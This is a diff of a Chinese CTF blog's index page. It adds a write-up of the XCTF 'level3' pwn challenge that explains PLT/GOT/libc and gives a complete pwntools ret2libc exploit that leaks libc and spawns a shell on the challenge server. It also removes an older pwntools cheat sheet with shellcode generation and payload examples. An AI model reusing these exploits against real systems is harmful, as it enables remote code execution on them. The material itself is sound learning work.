@@ -121,7 +121,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">36</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">37</span></a>
 
   </li>
   </ul>
@@ -147,6 +147,89 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/27/AD-level3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="带废物">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="全宇宙最蒻的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/27/AD-level3/" class="post-title-link" itemprop="url">AD_level3</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-03-27 13:28:44" itemprop="dateCreated datePublished" datetime="2021-03-27T13:28:44+08:00">2021-03-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-08 22:05:56" itemprop="dateModified" datetime="2021-04-08T22:05:56+08:00">2021-04-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="滚出新手村"><a href="#滚出新手村" class="headerlink" title="滚出新手村"></a>滚出新手村</h1><p>这是xctf新手区pwn题最后一题</p>
+<p>革命尚未成功同志仍需努力（×）</p>
+<p>只要我出了新手村就算成功（√）</p>
+<h1 id="plt表、got表和libc"><a href="#plt表、got表和libc" class="headerlink" title="plt表、got表和libc"></a>plt表、got表和libc</h1><p>首先假定程序里有函数A，函数A的内容是调用printf函数。</p>
+<p>printf函数位于libc动态库内（系统内所以进程共享同一个动态库）。</p>
+<p>一个编译单元（例如一个.cpp文件）编译成一个或多个中间文件（.o），这些中间文件由汇编指令构成，但里面不会包含printf函数的具体地址，因为编译器不知道具体位置在哪，（只要不是在本文件内的地址都不知道），所以中间文件中本该有printf函数的地方（call ······）会由一个符号替代，这跟符号用于告诉链接器这里的地址需要修正。</p>
+<p>接下来链接器链接中间文件来形成可执行文件。过程中：需要确保不论需要修正的函数的地址是在另外一个中间文件中还是在libc中，程序都能工作。故链接器的工作模式为：<br>1.如果需要修正的函数的地址在.o文件中，链接文件，完成修正地址。<br>2.否则，链接器会生成一段可以获取printf函数在libc地址的代码段（也是一个函数），链接到这个函数上。故在这种情况下，只要在程序运行时才能真正确定printf函数的真正地址和printf函数执行内容的代码。</p>
+<p>PLT表（Procedure Link Table）：就是上述链接器形成的代码段，由这些代码段构成的表。</p>
+<p>GOT表（Global Offset Table）:存放libc真正功能性代码的地址，由这些地址构成的表。</p>
+<p>libc动态库：存放自带的可调用的功能性函数。</p>
+<img src="/2021/03/27/AD-level3/1.jpg" class>
+<h1 id="新增python、pwntools内容"><a href="#新增python、pwntools内容" class="headerlink" title="新增python、pwntools内容"></a>新增python、pwntools内容</h1><p>相关内容已经更新在“pwn用到的工具汇总”</p>
+<h1 id="边学边做"><a href="#边学边做" class="headerlink" title="边学边做"></a>边学边做</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure>
+<p>现在程序执行到read函数中间<br>136个‘a’覆盖buf<br>再覆盖read函数中 存放母函数的ebp<br>接下来覆盖其返回地址为write_plt</p>
+<p>程序执行到read函数的ret，清空栈内包括write_plt_addr之前的所有东西，跳转到write_plt_addr</p>
+<p>对于write_plt_addr<br>main_addr成了它的返回地址<br>1，write_got_addr，4，成了它的参数</p>
+<p>于是通过write_got_addr成功泄露了write_got，并返回main函数，用于其它操作。<br>即使这里main_addr改为其它地址，仍然成功能泄露write_got_addr。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">63111</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./level3&quot;)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt_addr=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got_addr=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(write_plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got_addr)+p32(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc_base = write_got - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">payload2=<span class="number">0x88</span>*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>p32()将数据打包成4位字节的其它形式，相应的u32只能解包4个字节的数据<br>libc中函数名地址可直接查出，但具体执行地址在哪执行不知道<br>通过libc中write的函数名地址和执行地址，算出相对偏移</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -928,148 +1011,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="带废物">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="全宇宙最蒻的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" class="post-title-link" itemprop="url">pwn用到的工具汇总</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-12-19 15:53:00" itemprop="dateCreated datePublished" datetime="2020-12-19T15:53:00+08:00">2020-12-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-29 16:03:11" itemprop="dateModified" datetime="2021-04-29T16:03:11+08:00">2021-04-29</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>注：随手找的，如果没有找想要的用法再去搜</p>
-<h1 id="natcat"><a href="#natcat" class="headerlink" title="natcat"></a>natcat</h1><p>netcat通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，可以在脚本中以多种方式使用它。</p>
-<p>netcat所做的就是在两台电脑之间建立链接并返回两个数据流。<br>能建立一个服务器，传输文件，与朋友聊天，传输流媒体或者用它作为其它协议的独立客户端。</p>
-<p>用于打开一个shell<br>当在题目网页点击获取在线环境，云端便搭建了一个服务器<br>我在客户端仅仅简单连接到服务器（直观上感觉了进入一个文件夹）</p>
-<p>$nc -n ip地址 ip端口<br>你会得到一个shell提示符在客户端</p>
-<p>Linux nc命令<br>参数说明（用一个写一个）：<br>-n 直接使用IP地址，而不通过域名服务器。<br>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</p>
-<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><p>使用<code>from pwn import *</code>将所有的模块导入到当前namespace，这条语句还会帮你把os,sys等常用的系统库导入。</p>
-<h2 id="常用模块如下："><a href="#常用模块如下：" class="headerlink" title="常用模块如下："></a>常用模块如下：</h2><p>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台<br>dynelf : 用于远程符号泄漏，需要提供leak方法<br>elf : 对elf文件进行操作<br>gdb : 配合gdb进行调试<br>memleak : 用于内存泄漏<br>shellcraft : shellcode的生成器<br>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE<br>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</p>
-<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地 ：sh &#x3D; porcess(&quot;.&#x2F;a&quot;)</span><br><span class="line">远程：sh &#x3D; remote(&quot;ip地址&quot;,端口)</span><br><span class="line">这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line">r &#x3D; process(&quot;.&#x2F;test&quot;)</span><br><span class="line">test即为文件名,这使得改变远程和本地十分方便.</span><br><span class="line">关闭连接：sh.close()</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure>
-<h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sh.send(data)  发送数据</span><br><span class="line">sh.sendline(data)  发送一行数据，相当于在数据后面加\n</span><br><span class="line">sh.recv(numb &#x3D; 2048, timeout &#x3D; dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends&#x3D;True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(&quot;Hello,World\n&quot;,drop&#x3D;fasle)  接受数据直到我们设置的标志出现</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout &#x3D; default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure>
-<h2 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h2><p>以xctf level3为例<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = ELF(<span class="string">&#x27;./ level3&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> e										<span class="comment">#e目前或许是一串路径，输出如下</span></span><br><span class="line">ELF(<span class="string">&#x27;/home/hacker/jiaoben/level3&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> e.address								<span class="comment"># 文件装载的基地址，十进制</span></span><br><span class="line"><span class="number">134512640</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.address)						<span class="comment">#加上十六进制转化函数，文件装载的基地址的十六进制</span></span><br><span class="line"><span class="number">0x8048000</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> e.symbols[<span class="string">&#x27;write&#x27;</span>]						<span class="comment">#write函数地址</span></span><br><span class="line"><span class="number">134513472</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(e.symbols[<span class="string">&#x27;write&#x27;</span>])						<span class="comment">#同理</span></span><br><span class="line"><span class="number">0x8048340</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> e.got[<span class="string">&#x27;write&#x27;</span>]							<span class="comment">#got表中存放（write函数地址）的地址</span></span><br><span class="line"><span class="number">134520856</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> hex(e.got[<span class="string">&#x27;write&#x27;</span>])					<span class="comment">#同理</span></span><br><span class="line"><span class="number">0x804a018</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">print</span> p32(e.got[<span class="string">&#x27;write&#x27;</span>])					<span class="comment">#我是说，如果有人和我一样好奇打包机制的话</span></span><br><span class="line">\x18\x04</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> hex(e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next())		<span class="comment"># 字符串/bin/sh的地址，python这么强大的吗？？？</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="整数pack与数据unpack"><a href="#整数pack与数据unpack" class="headerlink" title="整数pack与数据unpack"></a>整数pack与数据unpack</h2><p>pack：p32，p64<br>unpack：u32，u64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;a&#39;)</span><br><span class="line">b &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x80 + 0x8) + p64(b)</span><br><span class="line">...	</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32()</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="PWN-shellcode"><a href="#PWN-shellcode" class="headerlink" title="PWN-shellcode"></a>PWN-shellcode</h2><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。（以下为获取pwntools内置集成）</p>
-<p>（1）先设置目标机的参数<br>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p>
-<p>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux<br>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’<br>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</p>
-<p>（2）获取shellcode<br>获得执行system(“/bin/sh”)汇编代码所对应的机器码<br>asm(shellcraft.sh())<br>具体利用如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
-<h2 id="大佬关于pwntools的博客"><a href="#大佬关于pwntools的博客" class="headerlink" title="大佬关于pwntools的博客"></a>大佬关于pwntools的博客</h2><p>引入pwntools库<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 虽然不太符合pylint代码规范</span></span><br><span class="line"><span class="comment"># 但官方也推荐这样引用</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></p>
-<p>基本的输入输出和交互<br>绑定要处理的程序</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 远程</span></span><br><span class="line"><span class="comment"># remote(ip/hostname, port)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地</span></span><br><span class="line"><span class="comment"># 注意process中参数一定要有./</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>设置上下文环境<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置上下文环境主要用于一些需要上下文的漏洞利用</span></span><br><span class="line"><span class="comment"># 比如：shellcode的生成</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置操作系统</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># 设置32位的体系架构 </span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># 设置64位的体系架构</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 打印交互中的输入和输出</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 也可以直接这样写</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, lod_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空之前的上下文</span></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># 清空之前的上下文并设置为64位的体系架构</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>获取程序输出<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recv()        <span class="comment"># 默认接受最大为4096字节的输出</span></span><br><span class="line">p.recvline()    <span class="comment"># 接受程序的一行输出</span></span><br><span class="line">p.recvall()     <span class="comment"># 接受程序的当前全部输出，直到遇到EOF</span></span><br><span class="line"><span class="comment">### 直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</span></span><br><span class="line">buf = p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)   </span><br></pre></td></tr></table></figure></p>
-<p>payload的构造<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pad = cyclic(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 可以用上面的代码替代传统的构造方式 pad = b&quot;A&quot; * 0x10</span></span><br><span class="line"><span class="comment"># 其结果为 b&#x27;aaaabaaacaaadaaa&#x27;</span></span><br><span class="line">offset = cyclic_find(<span class="string">b&quot;daaa&quot;</span>)  <span class="comment"># 找到当前pad的偏移值</span></span><br></pre></td></tr></table></figure></p>
-<p>实现输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; b&#39;hello!&#39;      # python3，payload为字节类型</span><br><span class="line">p.sendline(payload)      # 输入hello! + \n</span><br><span class="line">p.send(payload)          # 输入hello!</span><br><span class="line">p.sendafter(&quot;test&quot;, payload)      # 在接受到test后才发送payload</span><br><span class="line">p.sendlineafter(&quot;test&quot;, payload)  # 在接受到test后才发送payload + \n</span><br></pre></td></tr></table></figure></p>
-<p>实现交互<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启和程序交互的终端</span></span><br><span class="line"><span class="comment"># 一般用于获取到shell的情况</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>获取程序或者libc中的信息<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./program&quot;</span>)  <span class="comment"># 加载样本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)    <span class="comment"># 加载libc</span></span><br><span class="line"></span><br><span class="line">read_addr = pro.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取read函数地址</span></span><br><span class="line">read_plt = pro.plt[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的plt表地址，内容等于symbols[&quot;read&quot;]</span></span><br><span class="line">read_got = pro.got[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的got表地址</span></span><br><span class="line"><span class="comment"># search的参数为字节类型</span></span><br><span class="line"><span class="comment"># 获取字符串的位置</span></span><br><span class="line">str_addr = next(pro.search(<span class="string">b&quot;str&quot;</span>))</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取libc中read的固定偏移值</span></span><br><span class="line">bin_sh = next(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># 获取/bin/sh的位置</span></span><br></pre></td></tr></table></figure></p>
-<p>shellcode的生成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 汇编代码</span></span><br><span class="line">code = asm(code)        <span class="comment"># opcode，payload中都使用这个</span></span><br></pre></td></tr></table></figure></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 64位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 同上</span></span><br><span class="line">code = asm(code)        <span class="comment"># 同上</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面是执行execve(&quot;/bin/sh\x00&quot;)的shellcode</span></span><br><span class="line"><span class="comment"># 下面展示直接读取flag文件然后打印的shellcode</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">mmap = <span class="number">0x12345678</span>  <span class="comment"># 可读可写内存区域</span></span><br><span class="line"></span><br><span class="line">code = shellcraft.open(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code += shellcrafr.write(<span class="number">1</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code = asm(code)</span><br></pre></td></tr></table></figure>
